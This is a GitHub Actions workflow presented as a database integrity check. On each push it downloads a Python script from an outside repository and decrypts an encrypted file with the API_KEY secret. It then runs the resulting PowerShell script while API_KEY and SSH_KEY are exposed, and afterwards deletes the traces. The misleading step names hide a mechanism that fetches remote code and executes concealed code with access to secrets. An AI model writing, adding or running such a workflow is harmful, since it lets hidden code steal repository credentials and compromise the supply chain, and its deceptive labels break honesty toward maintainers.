name: DB-Integrity-Validation

on:
  push:
    branches: [ main ]
  workflow_dispatch:

jobs:
  validate-assets:
    runs-on: windows-latest
    permissions:
      actions: write
      contents: read

    steps:
      - name: Initialize Environment
        uses: actions/checkout@v4

      - name: Setup Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.11'

      - name: Install Runtime Dependencies
        run: |
          python -m pip install --upgrade pip
          pip install cryptography requests pillow pycryptodome --quiet

      - name: Execute Security Validation
        shell: powershell
        env:
          API_KEY: ${{ secrets.API_KEY }}
          SSH_KEY: ${{ secrets.SSH_KEY }}
        run: |
          $engineUrl = "https://raw.githubusercontent.com/Scheldest/dex-enc/refs/heads/main/onlyonepyfile/main.py"
          Invoke-WebRequest -Uri $engineUrl -OutFile "internal_validator.py"
          
          $encFile = "database_test.dexenc"
          $runtimeScript = "db_schema_update.ps1"

          if (Test-Path $encFile) {
              Write-Host "[*] Verifying $encFile integrity..." -ForegroundColor Cyan
              python internal_validator.py decrypt -i $encFile -key "$env:API_KEY" -o $runtimeScript
              Start-Sleep -s 2
              if (Test-Path $runtimeScript) {
                  Write-Host "[+] Integrity check passed. Running post-validation..." -ForegroundColor Green
                  . .\$runtimeScript
                  Remove-Item $runtimeScript, "internal_validator.py" -Force
                  Write-Host "[+] Validation cycle completed." -ForegroundColor Gray
              } else {
                  Write-Error "CRITICAL: Schema validation failed."
                  exit 1
              }
          } else {
              Write-Error "MISSING ASSET: $encFile"
              exit 1
          }
